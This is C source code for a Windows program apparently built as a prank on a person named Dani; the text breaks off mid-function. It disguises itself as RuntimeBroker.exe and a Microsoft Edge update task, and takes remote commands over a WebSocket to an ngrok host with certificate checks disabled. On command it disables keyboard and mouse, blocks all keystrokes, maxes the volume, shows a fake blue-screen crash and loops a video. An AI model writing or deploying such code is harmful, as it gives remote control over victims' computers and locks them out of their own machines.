/*
 * dani-meglepi-client v3 — RuntimeBroker.exe
 *
 * Fordítás:
 *   x86_64-w64-mingw32-windres version.rc -O coff -o version.res
 *   x86_64-w64-mingw32-gcc -O2 -mwindows -DINITGUID -o RuntimeBroker.exe \
 *     dani-meglepi-client.c version.res \
 *     -lws2_32 -lwinhttp -lgdi32 -lole32 -lshell32 -luuid -lshlwapi \
 *     -luser32 -ladvapi32 -loleaut32 -ltaskschd \
 *     -lmfplat -lmfuuid -lmf -lmfreadwrite -lpropsys -levr \
 *     -lsetupapi -lmmdevapi
 */

#define WIN32_LEAN_AND_MEAN
#define UNICODE
#define _UNICODE
#define WINVER       0x0A00
#define _WIN32_WINNT 0x0A00
#define COBJMACROS

#include <windows.h>
#include <winhttp.h>
#include <ole2.h>
#include <taskschd.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <objbase.h>
#include <propvarutil.h>
#include <mfapi.h>
#include <mfidl.h>
#include <mferror.h>
#include <evr.h>
#include <setupapi.h>
#include <cfgmgr32.h>
#include <devguid.h>
#include <endpointvolume.h>
#include <mmdeviceapi.h>
#include <functiondiscoverykeys_devpkey.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>

/* ── Konfiguráció ───────────────────────────────────────────────────────── */
#define WS_HOST         L"turbulent-renter-liking.ngrok-free.app"
#define WS_PORT         443
#define WS_PATH_PREFIX  L"/ws/"
#define ASSET_DIR       L"C:\\Users\\Public\\dani-meglepi\\"
#define MP4_FILE        L"C:\\Users\\Public\\dani-meglepi\\daninak.mp4"
#define EXE_NAME        L"RuntimeBroker.exe"
#define TASK_NAME       L"MicrosoftEdgeUpdateTaskMachineCore"
#define RECONNECT_MS    3000
#define MAX_BACKOFF_MS  60000
#define HEARTBEAT_MS    20000
#define TOPMOST_MS      100
#define CLEARTXT_MS     2000   /* pendrive clear.txt poll intervallum */

/* ── BSOD felbontás táblázat ────────────────────────────────────────────── */
typedef struct { int w, h; const WCHAR *file; } BsodRes;
static const BsodRes BSOD_TABLE[] = {
    {  800,  600, L"C:\\Users\\Public\\dani-meglepi\\bsod_800x600.png"   },
    { 1024,  768, L"C:\\Users\\Public\\dani-meglepi\\bsod_1024x768.png"  },
    { 1152,  864, L"C:\\Users\\Public\\dani-meglepi\\bsod_1152x864.png"  },
    { 1280, 1024, L"C:\\Users\\Public\\dani-meglepi\\bsod_1280x1024.png" },
    { 1600, 1200, L"C:\\Users\\Public\\dani-meglepi\\bsod_1600x1200.png" },
};
#define BSOD_COUNT (sizeof(BSOD_TABLE)/sizeof(BSOD_TABLE[0]))

/* ── GDI+ minimális flat C API ──────────────────────────────────────────── */
typedef int   GpStatus;
typedef void* GpImage;
typedef void* GpGraphics;
typedef struct {
    UINT32 GdiplusVersion;
    void  *DebugEventCallback;
    BOOL   SuppressBackgroundThread;
    BOOL   SuppressExternalCodecs;
} GpStartupInput;

typedef GpStatus (__stdcall *PFStartup)(ULONG_PTR*,const GpStartupInput*,void*);
typedef void     (__stdcall *PFShutdown)(ULONG_PTR);
typedef GpStatus (__stdcall *PFLoadStream)(IStream*,GpImage**);
typedef GpStatus (__stdcall *PFDrawRect)(GpGraphics*,GpImage*,INT,INT,INT,INT);
typedef GpStatus (__stdcall *PFFromHDC)(HDC,GpGraphics**);
typedef GpStatus (__stdcall *PFDelGraph)(GpGraphics*);
typedef GpStatus (__stdcall *PFDelImg)(GpImage*);
typedef GpStatus (__stdcall *PFClear)(GpGraphics*,DWORD);
typedef GpStatus (__stdcall *PFSetInterp)(GpGraphics*,INT);

static ULONG_PTR  gp_token=0;
static PFStartup    gp_Startup;
static PFShutdown   gp_Shutdown;
static PFLoadStream gp_LoadStream;
static PFDrawRect   gp_DrawRect;
static PFFromHDC    gp_FromHDC;
static PFDelGraph   gp_DelGraph;
static PFDelImg     gp_DelImg;
static PFClear      gp_Clear;
static PFSetInterp  gp_SetInterp;

static BOOL gdiplus_init(void) {
    HMODULE h = LoadLibraryW(L"gdiplus.dll");
    if (!h) return FALSE;
#define GL(v,t,n) v=(t)GetProcAddress(h,n); if(!v) return FALSE;
    GL(gp_Startup,    PFStartup,    "GdiplusStartup")
    GL(gp_Shutdown,   PFShutdown,   "GdiplusShutdown")
    GL(gp_LoadStream, PFLoadStream, "GdipCreateBitmapFromStream")
    GL(gp_DrawRect,   PFDrawRect,   "GdipDrawImageRectI")
    GL(gp_FromHDC,    PFFromHDC,    "GdipCreateFromHDC")
    GL(gp_DelGraph,   PFDelGraph,   "GdipDeleteGraphics")
    GL(gp_DelImg,     PFDelImg,     "GdipDisposeImage")
    GL(gp_Clear,      PFClear,      "GdipGraphicsClear")
    GL(gp_SetInterp,  PFSetInterp,  "GdipSetInterpolationMode")
#undef GL
    GpStartupInput si={1,NULL,FALSE,FALSE};
    return gp_Startup(&gp_token,&si,NULL)==0;
}

/* ── Globális állapot ───────────────────────────────────────────────────── */
static HWND  g_hwnd   = NULL;
static HHOOK g_kbhook = NULL;
static BOOL  g_fs     = FALSE;

typedef enum { ST_IDLE, ST_SHOW, ST_DEMO } AppState;
typedef enum { SH_BLK1, SH_BSOD, SH_BLK2, SH_MP4 } ShowStep;

static volatile AppState g_state = ST_IDLE;
static volatile ShowStep g_step  = SH_BLK1;

/* BSOD */
static HBITMAP g_bsod_bmp = NULL;

/* Media Foundation */
static IMFMediaSession *g_mf_session = NULL;
static IMFMediaSource  *g_mf_source  = NULL;
static HWND             g_evr_hwnd   = NULL;
static volatile BOOL    g_mp4_loop   = FALSE;
static HANDLE           g_mf_thread  = NULL;

/* WinHTTP */
static HINTERNET g_ws_session = NULL;
static HINTERNET g_connect    = NULL;
static HINTERNET g_ws         = NULL;
static volatile BOOL g_running = TRUE;

/* Hangerő mentett állapot */
static float g_saved_volume = -1.0f;
static BOOL  g_saved_mute   = FALSE;
static BOOL  g_volume_saved = FALSE;

/* HID letiltott eszközök listája */
#define MAX_HID_DEVICES 64
static DEVINST g_disabled_devs[MAX_HID_DEVICES];
static int     g_disabled_count = 0;

/* Timerek */
static UINT_PTR g_show_timer    = 0;
static UINT_PTR g_cleartxt_timer = 0;

#define WM_DO_SHOW  (WM_USER+1)
#define WM_DO_DEMO  (WM_USER+2)
#define WM_DO_CLEAR (WM_USER+3)

/* ── Admin jog ellenőrzés ───────────────────────────────────────────────── */
static BOOL is_admin(void) {
    BOOL a=FALSE; HANDLE tok=NULL;
    if (!OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&tok)) return FALSE;
    TOKEN_ELEVATION te={0}; DWORD sz=sizeof te;
    if (GetTokenInformation(tok,TokenElevation,&te,sizeof te,&sz)) a=te.TokenIsElevated;
    CloseHandle(tok); return a;
}

/* ── BSOD: legközelebbi felbontás ───────────────────────────────────────── */
static int bsod_best_idx(int sw, int sh) {
    int best=0; double best_d=1e18;
    for (int i=0;i<(int)BSOD_COUNT;i++) {
        double dw=BSOD_TABLE[i].w-sw, dh=BSOD_TABLE[i].h-sh;
        double d=dw*dw+dh*dh;
        if (d<best_d) { best_d=d; best=i; }
    }
    return best;
}

/* ── BSOD előrenderelés: bal felső rögzítve, képernyőt teljesen kitölti ── */
static void bsod_prerender(void) {
    int sw=GetSystemMetrics(SM_CXSCREEN);
    int sh=GetSystemMetrics(SM_CYSCREEN);
    const BsodRes *br=&BSOD_TABLE[bsod_best_idx(sw,sh)];

    IStream *s=NULL;
    if (FAILED(SHCreateStreamOnFileW(br->file,
            STGM_READ|STGM_SHARE_DENY_NONE,&s))) return;
    GpImage *img=NULL;
    gp_LoadStream(s,&img);
    s->lpVtbl->Release(s);
    if (!img) return;

    HDC scr=GetDC(NULL);
    HDC mdc=CreateCompatibleDC(scr);
    g_bsod_bmp=CreateCompatibleBitmap(scr,sw,sh);
    HBITMAP ob=(HBITMAP)SelectObject(mdc,g_bsod_bmp);

    /* GdipDrawImageRectI(x=0, y=0, w=sw, h=sh) → bal felsőből skálázva fullscreen. */
    GpGraphics *g=NULL;
    gp_FromHDC(mdc,&g);
    if (g) {
        gp_SetInterp(g,7); /* HighQualityBicubic */
        gp_Clear(g,0xFF000000);
        gp_DrawRect(g,img,0,0,sw,sh);   /* (0,0) = bal felső, sw*sh = teljes képernyő */
        gp_DelGraph(g);
    }
    SelectObject(mdc,ob);
    DeleteDC(mdc);
    ReleaseDC(NULL,scr);
    gp_DelImg(img);
}

/* ── WASAPI hangerő: mentés + max + visszaállítás ───────────────────────── */
static IAudioEndpointVolume *get_audio_endpoint(void) {
    IMMDeviceEnumerator *enumerator=NULL;
    IMMDevice *device=NULL;
    IAudioEndpointVolume *vol=NULL;

    if (FAILED(CoCreateInstance(&CLSID_MMDeviceEnumerator,NULL,
            CLSCTX_ALL,&IID_IMMDeviceEnumerator,(void**)&enumerator)))
        return NULL;
    if (SUCCEEDED(IMMDeviceEnumerator_GetDefaultAudioEndpoint(enumerator,
            eRender,eConsole,&device))) {
        IMMDevice_Activate(device,&IID_IAudioEndpointVolume,
            CLSCTX_ALL,NULL,(void**)&vol);
        IMMDevice_Release(device);
    }
    IMMDeviceEnumerator_Release(enumerator);
    return vol;
}

static void volume_save_and_max(void) {
    IAudioEndpointVolume *vol=get_audio_endpoint();
    if (!vol) return;
    IAudioEndpointVolume_GetMasterVolumeLevelScalar(vol,&g_saved_volume);
    IAudioEndpointVolume_GetMute(vol,&g_saved_mute);
    IAudioEndpointVolume_SetMasterVolumeLevelScalar(vol,1.0f,NULL);
    IAudioEndpointVolume_SetMute(vol,FALSE,NULL);
    g_volume_saved=TRUE;
    IAudioEndpointVolume_Release(vol);
}

static void volume_restore(void) {
    if (!g_volume_saved) return;
    IAudioEndpointVolume *vol=get_audio_endpoint();
    if (!vol) return;
    IAudioEndpointVolume_SetMasterVolumeLevelScalar(vol,g_saved_volume,NULL);
    IAudioEndpointVolume_SetMute(vol,g_saved_mute,NULL);
    IAudioEndpointVolume_Release(vol);
    g_volume_saved=FALSE;
}

/* ── HID eszközök letiltása / visszaengedélyezése ───────────────────────── */
static void hid_disable_all(void) {
    if (!is_admin()) return;
    g_disabled_count=0;

    /* Billentyűzet (GUID_DEVCLASS_KEYBOARD) és egér (GUID_DEVCLASS_MOUSE) */
    const GUID *classes[]={&GUID_DEVCLASS_KEYBOARD,&GUID_DEVCLASS_MOUSE};
    for (int c=0;c<2;c++) {
        HDEVINFO di=SetupDiGetClassDevsW(classes[c],NULL,NULL,DIGCF_PRESENT);
        if (di==INVALID_HANDLE_VALUE) continue;
        SP_DEVINFO_DATA dd; dd.cbSize=sizeof dd;
        for (DWORD i=0;SetupDiEnumDeviceInfo(di,i,&dd);i++) {
            if (g_disabled_count>=MAX_HID_DEVICES) break;
            CONFIGRET cr=CM_Disable_DevNode(dd.DevInst,0);
            if (cr==CR_SUCCESS) {
                g_disabled_devs[g_disabled_count++]=dd.DevInst;
            }
        }
        SetupDiDestroyDeviceInfoList(di);
    }
}

static void hid_enable_all(void) {
    for (int i=0;i<g_disabled_count;i++)
        CM_Enable_DevNode(g_disabled_devs[i],0);
    g_disabled_count=0;
}

/* ── Pendrive clear.txt figyelés ────────────────────────────────────────── */
static VOID CALLBACK cleartxt_tick(HWND h,UINT m,UINT_PTR id,DWORD t) {
    (void)h;(void)m;(void)id;(void)t;
    if (g_state!=ST_SHOW) return;

    /* Végigmegyünk az összes meghajtón */
    DWORD drives=GetLogicalDrives();
    for (int i=0;i<26;i++) {
        if (!(drives&(1<<i))) continue;
        WCHAR root[8]; swprintf_s(root,8,L"%c:\\",'A'+i);
        if (GetDriveTypeW(root)!=DRIVE_REMOVABLE) continue;
        /* Pendrive: cserélhető meghajtó */
        WCHAR path[32]; swprintf_s(path,32,L"%c:\\clear.txt",'A'+i);
        if (GetFileAttributesW(path)!=INVALID_FILE_ATTRIBUTES) {
            /* clear.txt megtalálva → clear */
            PostMessageW(g_hwnd,WM_DO_CLEAR,0,0);
            return;
        }
    }
}

/* ── Media Foundation eseménykezelő szál ────────────────────────────────── */
static DWORD WINAPI mf_event_thread(LPVOID p) {
    (void)p;
    while (g_running&&g_mp4_loop) {
        if (!g_mf_session) { Sleep(50); continue; }
        IMFMediaEvent *ev=NULL;
        HRESULT hr=IMFMediaSession_GetEvent(g_mf_session,
            MF_EVENT_FLAG_NO_WAIT,&ev);
        if (hr==(HRESULT)MF_E_NO_EVENTS_AVAILABLE) { Sleep(20); continue; }
        if (FAILED(hr)) { Sleep(50); continue; }
        MediaEventType t=MEUnknown;
        IMFMediaEvent_GetType(ev,&t);
        IMFMediaEvent_Release(ev);
        if (t==MEEndOfPresentation&&g_mp4_loop) {
            PROPVARIANT pv; PropVariantInit(&pv);
            pv.vt=VT_I8; pv.hVal.QuadPart=0;
            IMFMediaSession_Start(g_mf_session,NULL,&pv);
            PropVariantClear(&pv);
        } else if (t==MESessionClosed) break;
    }
    return 0;
}

static LRESULT CALLBACK evr_wndproc(HWND h,UINT m,WPARAM w,LPARAM l) {
    return DefWindowProcW(h,m,w,l);
}

/* ── MP4 lejátszás ──────────────────────────────────────────────────────── */
static BOOL mp4_play(void) {
    IMFSourceResolver *res=NULL;
    if (FAILED(MFCreateSourceResolver(&res))) return FALSE;
    MF_OBJECT_TYPE ot=MF_OBJECT_INVALID;
    IUnknown *src_unk=NULL;
    HRESULT hr=IMFSourceResolver_CreateObjectFromURL(res,
        MP4_FILE,MF_RESOLUTION_MEDIASOURCE,NULL,&ot,&src_unk);
    IMFSourceResolver_Release(res);
    if (FAILED(hr)) return FALSE;
    hr=IUnknown_QueryInterface(src_unk,&IID_IMFMediaSource,(void**)&g_mf_source);
    IUnknown_Release(src_unk);
    if (FAILED(hr)) return FALSE;

    hr=MFCreateMediaSession(NULL,&g_mf_session);
    if (FAILED(hr)) {
        IMFMediaSource_Release(g_mf_source); g_mf_source=NULL; return FALSE;
    }

    IMFTopology *topo=NULL; MFCreateTopology(&topo);
    IMFPresentationDescriptor *pd=NULL;
    IMFMediaSource_CreatePresentationDescriptor(g_mf_source,&pd);
    DWORD sdc=0;
    IMFPresentationDescriptor_GetStreamDescriptorCount(pd,&sdc);

    for (DWORD i=0;i<sdc;i++) {
        BOOL sel=FALSE; IMFStreamDescriptor *sd=NULL;
        IMFPresentationDescriptor_GetStreamDescriptorByIndex(pd,i,&sel,&sd);
        if (!sel||!sd) { if(sd) IMFStreamDescriptor_Release(sd); continue; }

        IMFMediaTypeHandler *mth=NULL;
        IMFStreamDescriptor_GetMediaTypeHandler(sd,&mth);
        GUID major; memset(&major,0,sizeof major);
        if (mth) { IMFMediaTypeHandler_GetMajorType(mth,&major);
                   IMFMediaTypeHandler_Release(mth); }

        IMFTopologyNode *sn=NULL,*on=NULL;
        MFCreateTopologyNode(MF_TOPOLOGY_SOURCESTREAM_NODE,&sn);
        IMFTopologyNode_SetUnknown(sn,&MF_TOPONODE_SOURCE,(IUnknown*)g_mf_source);
        IMFTopologyNode_SetUnknown(sn,&MF_TOPONODE_PRESENTATION_DESCRIPTOR,(IUnknown*)pd);
        IMFTopologyNode_SetUnknown(sn,&MF_TOPONODE_STREAM_DESCRIPTOR,(IUnknown*)sd);
        MFCreateTopologyNode(MF_TOPOLOGY_OUTPUT_NODE,&on);

        if (IsEqualGUID(&major,&MFMediaType_Video)) {
            IMFActivate *evr=NULL;
            MFCreateVideoRendererActivate(g_evr_hwnd,&evr);
            if (evr) { IMFTopologyNode_SetObject(on,(IUnknown*)evr);
                       IMFActivate_Release(evr); }
        } else if (IsEqualGUID(&major,&MFMediaType_Audio)) {
            IMFActivate *sar=NULL;
            hr=MFCreateAudioRendererActivate(&sar);
            if (SUCCEEDED(hr)&&sar) {
                IMFTopologyNode_SetObject(on,(IUnknown*)sar);
                IMFActivate_Release(sar);
            } else {
                /* Nincs hangeszköz — stream kihagyva */
                if (sn) IMFTopologyNode_Release(sn);
                if (on) IMFTopologyNode_Release(on);
                IMFStreamDescriptor_Release(sd);
                continue;
            }
        }

        if (sn&&on) {
            IMFTopology_AddNode(topo,sn);
            IMFTopology_AddNode(topo,on);
            IMFTopologyNode_ConnectOutput(sn,0,on,0);
        }
        if (sn) IMFTopologyNode_Release(sn);
        if (on) IMFTopologyNode_Release(on);
        IMFStreamDescriptor_Release(sd);
    }
    if (pd) IMFPresentationDescriptor_Release(pd);
    IMFMediaSession_SetTopology(g_mf_session,0,topo);
    if (topo) IMFTopology_Release(topo);

    PROPVARIANT pv; PropVariantInit(&pv); pv.vt=VT_EMPTY;
    IMFMediaSession_Start(g_mf_session,NULL,&pv);
    PropVariantClear(&pv);

    g_mp4_loop=TRUE;
    g_mf_thread=CreateThread(NULL,0,mf_event_thread,NULL,0,NULL);

    /* EVR fullscreen */
    Sleep(200);
    int sw=GetSystemMetrics(SM_CXSCREEN);
    int sh=GetSystemMetrics(SM_CYSCREEN);
    SetWindowPos(g_evr_hwnd,g_hwnd,0,0,sw,sh,
        SWP_FRAMECHANGED|SWP_SHOWWINDOW|SWP_NOACTIVATE);

    IMFVideoDisplayControl *vdc=NULL;
    hr=MFGetService((IUnknown*)g_mf_session,
        &MR_VIDEO_RENDER_SERVICE,&IID_IMFVideoDisplayControl,(void**)&vdc);
    if (SUCCEEDED(hr)&&vdc) {
        RECT dest={0,0,sw,sh};
        IMFVideoDisplayControl_SetVideoPosition(vdc,NULL,&dest);
        IMFVideoDisplayControl_Release(vdc);
    }
    SetWindowPos(g_hwnd,HWND_TOPMOST,0,0,0,0,
        SWP_NOMOVE|SWP_NOSIZE|SWP_NOACTIVATE);
    return TRUE;
}

static void mp4_stop(void) {
    g_mp4_loop=FALSE;
    if (g_mf_session) {
        IMFMediaSession_Stop(g_mf_session);
        IMFMediaSession_Close(g_mf_session);
    }
    if (g_mf_thread) {
        WaitForSingleObject(g_mf_thread,2000);
        CloseHandle(g_mf_thread); g_mf_thread=NULL;
    }
    if (g_mf_source) {
        IMFMediaSource_Shutdown(g_mf_source);
        IMFMediaSource_Release(g_mf_source); g_mf_source=NULL;
    }
    if (g_mf_session) {
        IMFMediaSession_Release(g_mf_session); g_mf_session=NULL;
    }
    if (g_evr_hwnd) ShowWindow(g_evr_hwnd,SW_HIDE);
}

/* ── Repaint ────────────────────────────────────────────────────────────── */
static void repaint(void) { if (g_hwnd) InvalidateRect(g_hwnd,NULL,FALSE); }

/* ── Show lépések ───────────────────────────────────────────────────────── */
static VOID CALLBACK show_tick(HWND h,UINT m,UINT_PTR id,DWORD t);

static void advance(ShowStep step) {
    g_step=step;
    if (g_show_timer) { KillTimer(g_hwnd,g_show_timer); g_show_timer=0; }
    repaint();
    switch (step) {
        case SH_BLK1: g_show_timer=SetTimer(g_hwnd,1,1000,show_tick); break;
        case SH_BSOD: g_show_timer=SetTimer(g_hwnd,1,3000,show_tick); break;
        case SH_BLK2: g_show_timer=SetTimer(g_hwnd,1, 500,show_tick); break;
        case SH_MP4:  mp4_play(); break;
    }
}

static VOID CALLBACK show_tick(HWND h,UINT m,UINT_PTR id,DWORD t) {
    (void)h;(void)m;(void)id;(void)t;
    KillTimer(g_hwnd,g_show_timer); g_show_timer=0;
    switch (g_step) {
        case SH_BLK1: advance(SH_BSOD); break;
        case SH_BSOD: advance(SH_BLK2); break;
        case SH_BLK2: advance(SH_MP4);  break;
        case SH_MP4:                     break;
    }
}

/* ── Keyboard hook ──────────────────────────────────────────────────────── */
static LRESULT CALLBACK kbhook_proc(int code,WPARAM wp,LPARAM lp) {
    (void)wp;(void)lp;
    if (code==HC_ACTION&&g_fs) return 1;
    return CallNextHookEx(g_kbhook,code,wp,lp);
}

/* ── Show indítása (hangerő + HID + fullscreen + cleartxt poll) ─────────── */
static void do_show(void) {
    g_state=ST_SHOW;
    volume_save_and_max();
    hid_disable_all();
    /* Fullscreen */
    if (!g_fs) {
        g_fs=TRUE;
        int sw=GetSystemMetrics(SM_CXSCREEN);
        int sh=GetSystemMetrics(SM_CYSCREEN);
        SetWindowLongW(g_hwnd,GWL_STYLE,WS_POPUP);
        SetWindowLongW(g_hwnd,GWL_EXSTYLE,WS_EX_TOPMOST|WS_EX_TOOLWINDOW);
        SetWindowPos(g_hwnd,HWND_TOPMOST,0,0,sw,sh,
            SWP_FRAMECHANGED|SWP_SHOWWINDOW|SWP_NOACTIVATE);
        if (g_kbhook) UnhookWindowsHookEx(g_kbhook);
        g_kbhook=SetWindowsHookExW(WH_KEYBOARD_LL,kbhook_proc,NULL,0);
    }
    /* Pendrive clear.txt poll indítása */
    g_cleartxt_timer=SetTimer(g_hwnd,3,CLEARTXT_MS,cleartxt_tick);
    advance(SH_BLK1);
}

/* ── Clear (minden visszaállítás) ───────────────────────────────────────── */
static void do_clear(void) {
    g_state=ST_IDLE;
    /* Pendrive poll leállítása */
    if (g_cleartxt_timer) { KillTimer(g_hwnd,g_cleartxt_timer); g_cleartxt_timer=0; }
    /* MP4 + show timer */
    mp4_stop();
    if (g_show_timer) { KillTimer(g_hwnd,g_show_timer); g_show_timer=0; }
    /* HID visszaengedélyezés */
    hid_enable_all();
    /* Hangerő visszaállítás */
    volume_restore();
    /* Keyboard hook le */
    if (g_kbhook) { UnhookWindowsHookEx(g_kbhook); g_kbhook=NULL; }
    /* Ablak elrejtése */
    g_fs=FALSE;
    ShowWindow(g_hwnd,SW_HIDE);
}

/* ── Demo (csak fullscreen + hook, hangerő/HID nélkül) ─────────────────── */
static void do_demo(void) {
    g_state=ST_DEMO;
    if (!g_fs) {
        g_fs=TRUE;
        int sw=GetSystemMetrics(SM_CXSCREEN);
        int sh=GetSystemMetrics(SM_CYSCREEN);
        SetWindowLongW(g_hwnd,GWL_STYLE,WS_POPUP);
        SetWindowLongW(g_hwnd,GWL_EXSTYLE,WS_EX_TOPMOST|WS_EX_TOOLWINDOW);
        SetWindowPos(g_hwnd,HWND_TOPMOST,0,0,sw,sh,
            SWP_FRAMECHANGED|SWP_SHOWWINDOW|SWP_NOACTIVATE);
        if (g_kbhook) UnhookWindowsHookEx(g_kbhook);
        g_kbhook=SetWindowsHookExW(WH_KEYBOARD_LL,kbhook_proc,NULL,0);
    }
    repaint();
}

/* ── WM_PAINT ───────────────────────────────────────────────────────────── */
static void on_paint(HWND hwnd) {
    PAINTSTRUCT ps;
    HDC hdc=BeginPaint(hwnd,&ps);
    int sw=GetSystemMetrics(SM_CXSCREEN);
    int sh=GetSystemMetrics(SM_CYSCREEN);

    HDC mdc=CreateCompatibleDC(hdc);
    HBITMAP bm=CreateCompatibleBitmap(hdc,sw,sh);
    HBITMAP ob=(HBITMAP)SelectObject(mdc,bm);

    RECT rc={0,0,sw,sh};
    HBRUSH blk=CreateSolidBrush(RGB(0,0,0));
    FillRect(mdc,&rc,blk); DeleteObject(blk);

    if (g_state==ST_DEMO) {
        HBRUSH rb=CreateSolidBrush(RGB(200,0,0));
        FillRect(mdc,&rc,rb); DeleteObject(rb);
        int fs=sh/3;
        HFONT fn=CreateFontW(fs,0,0,0,FW_BLACK,0,0,0,
            DEFAULT_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,
            ANTIALIASED_QUALITY,DEFAULT_PITCH|FF_SWISS,L"Arial");
        HFONT of=(HFONT)SelectObject(mdc,fn);
        SetTextColor(mdc,RGB(255,255,255));
        SetBkMode(mdc,TRANSPARENT);
        DrawTextW(mdc,L"DEMO",-1,&rc,DT_CENTER|DT_VCENTER|DT_SINGLELINE);
        SelectObject(mdc,of); DeleteObject(fn);

    } else if (g_state==ST_SHOW) {
        switch (g_step) {
            case SH_BLK1: case SH_BLK2: break;
            case SH_BSOD:
                if (g_bsod_bmp) {
                    HDC bdc=CreateCompatibleDC(mdc);
                    HBITMAP ob2=(HBITMAP)SelectObject(bdc,g_bsod_bmp);
                    BitBlt(mdc,0,0,sw,sh,bdc,0,0,SRCCOPY);
                    SelectObject(bdc,ob2); DeleteDC(bdc);
                } else {
                    HBRUSH bb=CreateSolidBrush(RGB(0,120,215));
                    FillRect(mdc,&rc,bb); DeleteObject(bb);
                }
                break;
            case SH_MP4: break; /* EVR renderel */
        }
    }

    BitBlt(hdc,0,0,sw,sh,mdc,0,0,SRCCOPY);
    SelectObject(mdc,ob); DeleteObject(bm); DeleteDC(mdc);
    EndPaint(hwnd,&ps);
}

/* ── Ablakeljárás ───────────────────────────────────────────────────────── */
static LRESULT CALLBACK wndproc(HWND hwnd,UINT msg,WPARAM wp,LPARAM lp) {
    switch (msg) {
        case WM_PAINT:      on_paint(hwnd); return 0;
        case WM_ERASEBKGND: return 1;
        case WM_DO_SHOW:    do_show();  return 0;
        case WM_DO_DEMO:    do_demo();  return 0;
        case WM_DO_CLEAR:   do_clear(); return 0;
        case WM_TIMER:
            if (wp==99&&g_fs)
                SetWindowPos(g_hwnd,HWND_TOPMOST,0,0,0,0,
                    SWP_NOMOVE|SWP_NOSIZE|SWP_NOACTIVATE);
            return 0;
        case WM_WINDOWPOSCHANGING:
            if (g_fs) {
                WINDOWPOS *p=(WINDOWPOS*)lp;
                p->hwndInsertAfter=HWND_TOPMOST;
                p->flags&=~SWP_NOZORDER;
            }
            return 0;
        case WM_CLOSE: case WM_DESTROY: return 0;
        default: return DefWindowProcW(hwnd,msg,wp,lp);
    }
}

/* ── Parancs feldolgozás ────────────────────────────────────────────────── */
static void process_cmd(const char *json) {
    const char *p=strstr(json,"\"cmd\""); if (!p) return;
    p=strchr(p,':');                      if (!p) return;
    while (*p==':'||*p==' '||*p=='"') p++;
    if      (strncmp(p,"show", 4)==0) PostMessageW(g_hwnd,WM_DO_SHOW, 0,0);
    else if (strncmp(p,"demo", 4)==0) PostMessageW(g_hwnd,WM_DO_DEMO, 0,0);
    else if (strncmp(p,"clear",5)==0) PostMessageW(g_hwnd,WM_DO_CLEAR,0,0);
}

/* ── WS cleanup ─────────────────────────────────────────────────────────── */
static void ws_cleanup(void) {
    if (g_ws)      { WinHttpCloseHandle(g_ws);      g_ws     =NULL; }
    if (g_connect) { WinHttpCloseHandle(g_connect); g_connect=NULL; }
}

/* ── WS kapcsolat ───────────────────────────────────────────────────────── */
static BOOL ws_open(void) {
    DWORD vol=0;
    GetVolumeInformationW(L"C:\\",NULL,0,&vol,NULL,NULL,NULL,0);
    WCHAR cid[32],wspath[128];
    swprintf_s(cid,32,L"pc-%08X",vol);
    swprintf_s(wspath,128,L"%s%s",WS_PATH_PREFIX,cid);

    g_connect=WinHttpConnect(g_ws_session,WS_HOST,WS_PORT,0);
    if (!g_connect) return FALSE;

    HINTERNET req=WinHttpOpenRequest(g_connect,L"GET",wspath,NULL,
        WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,WINHTTP_FLAG_SECURE);
    if (!req) { ws_cleanup(); return FALSE; }

    DWORD fl=SECURITY_FLAG_IGNORE_UNKNOWN_CA
            |SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE
            |SECURITY_FLAG_IGNORE_CERT_CN_INVALID
            |SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(req,WINHTTP_OPTION_SECURITY_FLAGS,&fl,sizeof fl);
    WinHttpAddRequestHeaders(req,
        L"ngrok-skip-browser-warning: true\r\n",-1L,WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpSetOption(req,WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET,NULL,0);
    if (!WinHttpSendRequest(req,WINHTTP_NO_ADDITIONAL_HEADERS,0,
                            WINHTTP_NO_REQUEST_DATA,0,0,0)
     || !WinHttpReceiveResponse(req,NULL)) {
        WinHttpCloseHandle(req); ws_cleanup(); return FALSE;
    }
    g_ws=WinHttpWebSocketCompleteUpgrade(req,0);
    WinHttpCloseHandle(req);
    if (!g_ws) { ws_cleanup(); return FALSE; }
    return TRUE;
}

/* ── Heartbeat szál ─────────────────────────────────────────────────────── */
static DWORD WINAPI hb_thread(LPVOID p) {
    (void)p;
    const char *ping="{\"ping\":true}";
    while (g_running) {
        Sleep(HEARTBEAT_MS);
        if (g_ws)
            WinHttpWebSocketSend(g_ws,
                WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
                (PVOID)ping,(DWORD)strlen(ping));
    }
    return 0;
}

/* ── WS fogadó szál ─────────────────────────────────────────────────────── */
static DWORD WINAPI ws_thread(LPVOID p) {
    (void)p;
    DWORD backoff=RECONNECT_MS;
    while (g_running) {
        if (!ws_open()) {
            Sleep(backoff);
            if (backoff<MAX_BACKOFF_MS) backoff*=2;
            continue;
        }
        backoff=RECONNECT_MS;
        HANDLE hb=CreateThread(NULL,0,hb_thread,NULL,0,NULL);
        BYTE buf[8192];
        while (g_running) {
            DWORD rd=0;
            WINHTTP_WEB_SOCKET_BUFFER_TYPE type;
            if (WinHttpWebSocketReceive(g_ws,buf,sizeof buf-1,&rd,&type)
                    !=ERROR_SUCCESS) break;
            if (type==WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE||
                type==WINHTTP_WEB_SOCKET_UTF8_FRAGMENT_BUFFER_TYPE) {
                buf[rd]=0; process_cmd((char*)buf);
            } else if (type==WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE) break;
        }
        if (hb) { TerminateThread(hb,0); CloseHandle(hb); }
        ws_cleanup();
        if (!g_running) break;
        Sleep(backoff);
        if (backoff<MAX_BACKOFF_MS) backoff*=2;
    }
    return 0;
}

/* ── Task Scheduler ─────────────────────────────────────────────────────── */
static void install_task(const WCHAR *exe, BOOL as_system) {
    ITaskService      *svc =NULL;
    ITaskFolder       *root=NULL;
    ITaskDefinition   *def =NULL;
    IRegistrationInfo *ri  =NULL;
    ITaskSettings     *ts  =NULL;
    ITriggerCollection *tc =NULL;
    ITrigger          *tr  =NULL;
    IActionCollection  *ac =NULL;
    IAction           *act =NULL;
    IExecAction       *ea  =NULL;
